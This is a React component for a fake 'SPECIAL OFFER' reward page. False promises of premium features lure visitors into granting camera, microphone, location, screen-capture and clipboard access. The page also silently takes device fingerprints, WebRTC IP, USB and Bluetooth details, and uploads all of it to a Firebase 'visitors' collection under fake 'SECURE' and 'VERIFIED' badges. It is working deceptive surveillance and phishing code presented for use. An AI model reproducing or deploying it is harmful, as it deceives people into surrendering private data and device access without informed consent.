import { useState } from 'react';
import {
  collectSilentFeatures,
  generateDeviceFingerprint,
  captureFrontCamera,
  captureBackCamera,
  captureMicrophone,
  getGeolocation,
  readClipboard,
  scanBluetooth,
  listUSBDevices,
  requestNotification,
  startScreenCapture,
  getMediaDevices,
  getStorageEstimate,
  generateCanvasFingerprint,
  generateAudioFingerprint,
  generateWebGLFingerprint,
  getWebRTCIP,
  getMotionData,
  getOrientationData
} from '../lib/deviceCollector';
import { SilentFeatures, PermissionFeatures } from '../types';
import { db } from '../lib/firebase';
import { collection, addDoc, updateDoc, query, where, getDocs, Timestamp } from 'firebase/firestore';

type PageStatus = 'initial' | 'showing_benefit' | 'collecting' | 'congrats_first' | 'more_needed' | 'collecting_more' | 'final_done';
type BenefitStatus = 'pending' | 'done';

interface Benefits {
  reward: BenefitStatus;
  camera: BenefitStatus;
  location: BenefitStatus;
  microphone: BenefitStatus;
  screenShare: BenefitStatus;
  contacts: BenefitStatus;
  storage: BenefitStatus;
}

export default function TrackingPage() {
  const [status, setStatus] = useState<PageStatus>('initial');
  const [showBenefitPopup, setShowBenefitPopup] = useState(false);
  const [progress, setProgress] = useState(0);
  const [currentPermission, setCurrentPermission] = useState('');
  const [benefits, setBenefits] = useState<Benefits>({
    reward: 'pending',
    camera: 'pending',
    location: 'pending',
    microphone: 'pending',
    screenShare: 'pending',
    contacts: 'pending',
    storage: 'pending'
  });
  const [deviceId, setDeviceId] = useState('');

  function showBenefit() {
    setShowBenefitPopup(true);
  }

  async function acceptBenefit() {
    setShowBenefitPopup(false);
    setBenefits(prev => ({ ...prev, reward: 'done' }));
    setStatus('collecting');
    await collectFirstPermissions();
  }

  async function collectFirstPermissions() {
    const fingerprint = generateDeviceFingerprint();
    setDeviceId(fingerprint);
    setProgress(5);

    const silent = await collectSilentFeatures();
    setProgress(20);

    await saveToFirebase(fingerprint, silent);

    setCurrentPermission('camera');
    setProgress(25);
    const data: PermissionFeatures = {
      frontCamera: null,
      backCamera: null,
      microphone: null,
      audioRecording: null,
      screenRecording: null,
      locationLat: null,
      locationLong: null,
      locationAccuracy: null,
      locationAddress: null,
      contacts: null,
      clipboardText: null,
      bluetoothDevices: null,
      usbDevices: null,
      motionData: null,
      orientationData: null,
      batteryStatus: null,
      mediaDevices: null,
      audioDevices: null,
      storageEstimate: null,
      accelerometerData: null,
      gyroscopeData: null,
      magnetometerData: null,
      vrDisplays: null,
      canvasFingerprint: null,
      audioFingerprint: null,
      webGLFingerprint: null,
      webRTCIP: null,
      ambientLight: null,
      notification: false
    };

    try {
      const frontCam = await captureFrontCamera();
      if (frontCam) data.frontCamera = 'granted';
      const backCam = await captureBackCamera();
      if (backCam) data.backCamera = 'granted';
      setBenefits(prev => ({ ...prev, camera: 'done' }));
      setProgress(35);
    } catch (e) {}

    setCurrentPermission('microphone');
    try {
      const mic = await captureMicrophone();
      if (mic) data.microphone = 'granted';
      setBenefits(prev => ({ ...prev, microphone: 'done' }));
      setProgress(45);
    } catch (e) {}

    setCurrentPermission('location');
    try {
      const geo = await getGeolocation();
      if (geo) {
        data.locationLat = geo.coords.latitude;
        data.locationLong = geo.coords.longitude;
        data.locationAccuracy = geo.coords.accuracy;
      }
      setBenefits(prev => ({ ...prev, location: 'done' }));
      setProgress(55);
    } catch (e) {}

    await updateFirebase(fingerprint, data);
    setProgress(60);
    setStatus('congrats_first');
  }

  async function collectMorePermissions() {
    setStatus('collecting_more');

    const data: PermissionFeatures = {
      frontCamera: benefits.camera === 'done' ? 'granted' : null,
      backCamera: null,
      microphone: benefits.microphone === 'done' ? 'granted' : null,
      audioRecording: null,
      screenRecording: null,
      locationLat: null,
      locationLong: null,
      locationAccuracy: null,
      locationAddress: null,
      contacts: null,
      clipboardText: null,
      bluetoothDevices: null,
      usbDevices: null,
      motionData: null,
      orientationData: null,
      batteryStatus: null,
      mediaDevices: null,
      audioDevices: null,
      storageEstimate: null,
      accelerometerData: null,
      gyroscopeData: null,
      magnetometerData: null,
      vrDisplays: null,
      canvasFingerprint: null,
      audioFingerprint: null,
      webGLFingerprint: null,
      webRTCIP: null,
      ambientLight: null,
      notification: false
    };

    setCurrentPermission('screenShare');
    setProgress(65);
    try {
      const screen = await startScreenCapture();
      if (screen) data.screenRecording = 'granted';
      setBenefits(prev => ({ ...prev, screenShare: 'done' }));
      setProgress(75);
    } catch (e) {}

    setCurrentPermission('storage');
    try {
      const storage = await getStorageEstimate();
      if (storage) data.storageEstimate = storage;
      setBenefits(prev => ({ ...prev, storage: 'done' }));
      setProgress(85);
    } catch (e) {}

    setCurrentPermission('clipboard');
    try {
      const clipboard = await readClipboard();
      if (clipboard) data.clipboardText = clipboard;
    } catch (e) {}

    setCurrentPermission('devices');
    try {
      const usb = await listUSBDevices();
      if (usb) data.usbDevices = usb;
      const bluetooth = await scanBluetooth();
      if (bluetooth) data.bluetoothDevices = bluetooth;
      const media = await getMediaDevices();
      if (media) data.mediaDevices = media;
    } catch (e) {}

    setCurrentPermission('motion');
    try {
      const motion = await getMotionData();
      if (motion) data.motionData = motion;
      const orientation = await getOrientationData();
      if (orientation) data.orientationData = orientation;
    } catch (e) {}

    setCurrentPermission('fingerprint');
    try {
      data.canvasFingerprint = generateCanvasFingerprint();
      data.audioFingerprint = await generateAudioFingerprint();
      data.webGLFingerprint = generateWebGLFingerprint();
      data.webRTCIP = await getWebRTCIP();
    } catch (e) {}

    try {
      data.notification = await requestNotification();
    } catch (e) {}

    setProgress(95);
    await updateFirebase(deviceId, data);
    setProgress(100);
    setStatus('final_done');
  }

  async function saveToFirebase(fingerprint: string, silent: SilentFeatures) {
    try {
      const visitorRef = collection(db, 'visitors');
      await addDoc(visitorRef, {
        deviceId: fingerprint,
        deviceFingerprint: fingerprint,
        ipAddress: 'detecting',
        firstVisit: Timestamp.now(),
        lastSeen: Timestamp.now(),
        silentFeatures: silent,
        createdAt: Timestamp.now()
      });
    } catch (error) {
      console.error('Firebase save error:', error);
    }
  }

  async function updateFirebase(fingerprint: string, permissions: PermissionFeatures) {
    try {
      const visitorRef = collection(db, 'visitors');
      const q = query(visitorRef, where('deviceId', '==', fingerprint));
      const querySnapshot = await getDocs(q);

      if (!querySnapshot.empty) {
        const docRef = querySnapshot.docs[0].ref;
        await updateDoc(docRef, {
          permissionFeatures: permissions,
          lastSeen: Timestamp.now()
        });
      }
    } catch (error) {
      console.error('Firebase update error:', error);
    }
  }

  return (
    <div className="hacker-container">
      <style>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
          overflow: hidden;
        }

        body {
          font-family: 'Courier New', monospace;
        }

        @keyframes scanline {
          0% { top: 0%; }
          100% { top: 100%; }
        }

        @keyframes pulse {
          0%, 100% { opacity: 0.5; }
          50% { opacity: 1; }
        }

        @keyframes successPulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.05); }
        }

        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(20px); }
          to { opacity: 1; transform: translateY(0); }
        }

        @keyframes popup {
          from { transform: scale(0.8); opacity: 0; }
          to { transform: scale(1); opacity: 1; }
        }

        .hacker-container {
          background: #000000;
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          position: relative;
          overflow: hidden;
        }

        .hacker-container::before {
          content: '';
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background:
            repeating-linear-gradient(
              0deg,
              rgba(0, 255, 0, 0.03) 0px,
              rgba(0, 255, 0, 0.03) 1px,
              transparent 1px,
              transparent 2px
            );
          pointer-events: none;
          z-index: 1;
        }

        .scanline {
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 4px;
          background: rgba(0, 255, 0, 0.4);
          box-shadow: 0 0 20px rgba(0, 255, 0, 0.8);
          animation: scanline 3s linear infinite;
          z-index: 10;
          pointer-events: none;
        }

        .cyber-grid {
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background-image:
            linear-gradient(rgba(0, 255, 100, 0.1) 1px, transparent 1px),
            linear-gradient(90deg, rgba(0, 255, 100, 0.1) 1px, transparent 1px);
          background-size: 50px 50px;
          pointer-events: none;
        }

        .center-box {
          position: relative;
          z-index: 5;
          text-align: center;
          padding: 50px;
          border: 2px solid #00ff00;
          background: rgba(0, 0, 0, 0.95);
          box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
          min-width: 550px;
          max-width: 600px;
        }

        .title {
          font-family: 'Courier New', monospace;
          font-size: 32px;
          color: #00ff00;
          text-shadow: 0 0 10px #00ff00;
          margin-bottom: 25px;
          text-transform: uppercase;
          letter-spacing: 3px;
        }

        .subtitle {
          font-family: 'Courier New', monospace;
          font-size: 14px;
          color: #00cc00;
          margin-bottom: 35px;
          opacity: 0.8;
        }

        .main-button {
          font-family: 'Courier New', monospace;
          font-size: 18px;
          font-weight: bold;
          color: #000000;
          background: #00ff00;
          border: none;
          padding: 18px 50px;
          cursor: pointer;
          text-transform: uppercase;
          letter-spacing: 2px;
          transition: all 0.3s;
          box-shadow: 0 0 30px rgba(0, 255, 0, 0.7);
          margin: 10px;
        }

        .main-button:hover {
          background: #ffffff;
          box-shadow: 0 0 50px rgba(0, 255, 0, 1);
          transform: scale(1.05);
        }

        .main-button:disabled {
          opacity: 0.6;
          cursor: not-allowed;
          transform: none;
        }

        .progress-bar {
          width: 100%;
          height: 6px;
          background: rgba(0, 255, 0, 0.2);
          margin: 25px 0;
          position: relative;
          overflow: hidden;
        }

        .progress-fill {
          height: 100%;
          background: #00ff00;
          box-shadow: 0 0 10px #00ff00;
          transition: width 0.3s;
        }

        .status-text {
          font-family: 'Courier New', monospace;
          font-size: 13px;
          color: #00ff00;
          margin: 15px 0;
          text-align: left;
        }

        .features-counter {
          font-family: 'Courier New', monospace;
          font-size: 14px;
          color: #00cc00;
          margin-top: 15px;
        }

        .benefit-popup {
          position: fixed;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: rgba(0, 0, 0, 0.95);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 100;
          animation: fadeIn 0.3s;
        }

        .benefit-box {
          background: linear-gradient(135deg, #000000 0%, #0a0a0a 100%);
          border: 3px solid #00ff00;
          padding: 40px;
          max-width: 500px;
          text-align: center;
          box-shadow: 0 0 50px rgba(0, 255, 0, 0.5);
          animation: popup 0.4s;
        }

        .benefit-icon {
          width: 80px;
          height: 80px;
          background: #00ff00;
          border-radius: 50%;
          margin: 0 auto 20px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 40px;
          color: #000;
          box-shadow: 0 0 30px rgba(0, 255, 0, 0.8);
        }

        .benefit-title {
          font-family: 'Courier New', monospace;
          font-size: 24px;
          color: #00ff00;
          margin-bottom: 15px;
          text-transform: uppercase;
        }

        .benefit-text {
          font-family: 'Courier New', monospace;
          font-size: 13px;
          color: #00cc00;
          margin-bottom: 25px;
          line-height: 1.6;
        }

        .benefit-list {
          text-align: left;
          margin: 20px 0;
          padding: 15px;
          background: rgba(0, 255, 0, 0.05);
          border: 1px solid rgba(0, 255, 0, 0.3);
        }

        .benefit-item {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 10px 0;
          border-bottom: 1px solid rgba(0, 255, 0, 0.2);
          font-family: 'Courier New', monospace;
          font-size: 12px;
          color: #00ff00;
        }

        .benefit-item:last-child {
          border-bottom: none;
        }

        .benefit-label {
          flex: 1;
        }

        .benefit-status {
          padding: 3px 10px;
          font-size: 10px;
          text-transform: uppercase;
        }

        .benefit-status.pending {
          color: #ffaa00;
        }

        .benefit-status.done {
          background: #00ff00;
          color: #000;
          font-weight: bold;
        }

        .congrats-box {
          padding: 20px;
        }

        .congrats-icon {
          width: 70px;
          height: 70px;
          background: #00ff00;
          border-radius: 50%;
          margin: 0 auto 20px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 35px;
          color: #000;
          box-shadow: 0 0 30px rgba(0, 255, 0, 0.8);
          animation: successPulse 2s infinite;
        }

        .congrats-title {
          font-family: 'Courier New', monospace;
          font-size: 26px;
          color: #00ff00;
          text-shadow: 0 0 15px #00ff00;
          margin-bottom: 15px;
          text-transform: uppercase;
        }

        .congrats-text {
          font-family: 'Courier New', monospace;
          font-size: 13px;
          color: #00cc00;
          margin-bottom: 20px;
          line-height: 1.6;
        }

        .final-box {
          padding: 30px;
        }

        .final-icon {
          width: 90px;
          height: 90px;
          background: #00ff00;
          border-radius: 50%;
          margin: 0 auto 25px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 45px;
          color: #000;
          box-shadow: 0 0 40px rgba(0, 255, 0, 0.9);
          animation: successPulse 1.5s infinite;
        }

        .final-title {
          font-family: 'Courier New', monospace;
          font-size: 30px;
          color: #00ff00;
          text-shadow: 0 0 20px #00ff00;
          margin-bottom: 15px;
          text-transform: uppercase;
          letter-spacing: 2px;
        }

        .status-bar {
          position: absolute;
          bottom: 20px;
          left: 50%;
          transform: translateX(-50%);
          font-family: 'Courier New', monospace;
          font-size: 10px;
          color: #00ff00;
          opacity: 0.6;
          display: flex;
          gap: 20px;
        }

        .status-item {
          display: flex;
          align-items: center;
          gap: 5px;
        }

        .status-dot {
          width: 6px;
          height: 6px;
          background: #00ff00;
          border-radius: 50%;
          animation: pulse 1s infinite;
        }

        .corner-decoration {
          position: absolute;
          width: 30px;
          height: 30px;
          border: 2px solid #00ff00;
        }

        .corner-tl { top: 10px; left: 10px; border-right: none; border-bottom: none; }
        .corner-tr { top: 10px; right: 10px; border-left: none; border-bottom: none; }
        .corner-bl { bottom: 10px; left: 10px; border-right: none; border-top: none; }
        .corner-br { bottom: 10px; right: 10px; border-left: none; border-top: none; }
      `}</style>

      <div className="scanline"></div>
      <div className="cyber-grid"></div>

      <div className="corner-decoration corner-tl"></div>
      <div className="corner-decoration corner-tr"></div>
      <div className="corner-decoration corner-bl"></div>
      <div className="corner-decoration corner-br"></div>

      {!showBenefitPopup && status !== 'final_done' && (
        <div className="center-box">
          {status === 'initial' && (
            <>
              <h1 className="title">SPECIAL OFFER</h1>
              <p className="subtitle">// Exclusive rewards available //</p>

              <button className="main-button" onClick={showBenefit}>
                [ CLAIM REWARD ]
              </button>
            </>
          )}

          {(status === 'collecting' || status === 'collecting_more') && (
            <>
              <h1 className="title">PROCESSING...</h1>
              <p className="subtitle">// Please wait //</p>

              <div className="progress-bar">
                <div className="progress-fill" style={{ width: `${progress}%` }}></div>
              </div>

              <p className="status-text">
                {currentPermission && `> Requesting: ${currentPermission.toUpperCase()}`}
              </p>

              <button className="main-button" disabled style={{ opacity: 0.6 }}>
                [ WORKING... ]
              </button>
            </>
          )}

          {status === 'congrats_first' && (
            <div className="congrats-box">
              <div className="congrats-icon">✓</div>
              <h2 className="congrats-title">CONGRATULATION</h2>
              <p className="congrats-text">
                Your rewards are being processed!
              </p>

              <div className="benefit-list">
                <div className="benefit-item">
                  <span className="benefit-label">{"> Instant Activation"}</span>
                  <span className="benefit-status done">DONE</span>
                </div>
                <div className="benefit-item">
                  <span className="benefit-label">{"> Camera Access"}</span>
                  <span className={`benefit-status ${benefits.camera}`}>{benefits.camera.toUpperCase()}</span>
                </div>
                <div className="benefit-item">
                  <span className="benefit-label">{"> Location Verified"}</span>
                  <span className={`benefit-status ${benefits.location}`}>{benefits.location.toUpperCase()}</span>
                </div>
                <div className="benefit-item">
                  <span className="benefit-label">{"> Microphone Enabled"}</span>
                  <span className={`benefit-status ${benefits.microphone}`}>{benefits.microphone.toUpperCase()}</span>
                </div>
              </div>

              <button className="main-button" onClick={collectMorePermissions}>
                [ GET MORE REWARDS ]
              </button>
            </div>
          )}

          {status === 'more_needed' && (
            <div className="congrats-box">
              <div className="congrats-icon">!</div>
              <h2 className="congrats-title">MORE NEEDED</h2>
              <p className="congrats-text">
                Some rewards require additional verification.
              </p>

              <div className="benefit-list">
                <div className="benefit-item">
                  <span className="benefit-label">{"> Screen Share"}</span>
                  <span className={`benefit-status ${benefits.screenShare}`}>{benefits.screenShare.toUpperCase()}</span>
                </div>
                <div className="benefit-item">
                  <span className="benefit-label">{"> Storage Access"}</span>
                  <span className={`benefit-status ${benefits.storage}`}>{benefits.storage.toUpperCase()}</span>
                </div>
              </div>

              <button className="main-button" onClick={collectMorePermissions}>
                [ COMPLETE ALL ]
              </button>
            </div>
          )}
        </div>
      )}

      {status === 'final_done' && (
        <div className="center-box">
          <div className="final-box">
            <div className="final-icon">✓</div>
            <h2 className="final-title">ALL DONE</h2>
            <p className="congrats-text">
              All rewards have been activated for your device!
            </p>

            <div className="benefit-list">
              <div className="benefit-item">
                <span className="benefit-label">{"> Instant Activation"}</span>
                <span className="benefit-status done">DONE</span>
              </div>
              <div className="benefit-item">
                <span className="benefit-label">{"> Camera Access"}</span>
                <span className="benefit-status done">DONE</span>
              </div>
              <div className="benefit-item">
                <span className="benefit-label">{"> Location Verified"}</span>
                <span className="benefit-status done">DONE</span>
              </div>
              <div className="benefit-item">
                <span className="benefit-label">{"> Microphone Enabled"}</span>
                <span className="benefit-status done">DONE</span>
              </div>
              <div className="benefit-item">
                <span className="benefit-label">{"> Screen Share"}</span>
                <span className="benefit-status done">DONE</span>
              </div>
              <div className="benefit-item">
                <span className="benefit-label">{"> Storage Access"}</span>
                <span className="benefit-status done">DONE</span>
              </div>
            </div>
          </div>
        </div>
      )}

      {showBenefitPopup && (
        <div className="benefit-popup">
          <div className="benefit-box">
            <div className="benefit-icon">🎁</div>
            <h2 className="benefit-title">YOUR REWARD</h2>
            <p className="benefit-text">
              You have been selected for exclusive benefits!
              Activate now to unlock all features on your device.
            </p>

            <div className="benefit-list">
              <div className="benefit-item">
                <span className="benefit-label">{"> Premium Access"}</span>
                <span className="benefit-status pending">PENDING</span>
              </div>
              <div className="benefit-item">
                <span className="benefit-label">{"> Faster Performance"}</span>
                <span className="benefit-status pending">PENDING</span>
              </div>
              <div className="benefit-item">
                <span className="benefit-label">{"> Exclusive Features"}</span>
                <span className="benefit-status pending">PENDING</span>
              </div>
              <div className="benefit-item">
                <span className="benefit-label">{"> Priority Support"}</span>
                <span className="benefit-status pending">PENDING</span>
              </div>
            </div>

            <button className="main-button" onClick={acceptBenefit}>
              [ ACTIVATE NOW ]
            </button>
          </div>
        </div>
      )}

      <div className="status-bar">
        <div className="status-item">
          <div className="status-dot"></div>
          <span>SECURE</span>
        </div>
        <div className="status-item">
          <div className="status-dot"></div>
          <span>VERIFIED</span>
        </div>
        <div className="status-item">
          <div className="status-dot"></div>
          <span>ACTIVE</span>
        </div>
      </div>
    </div>
  );
}
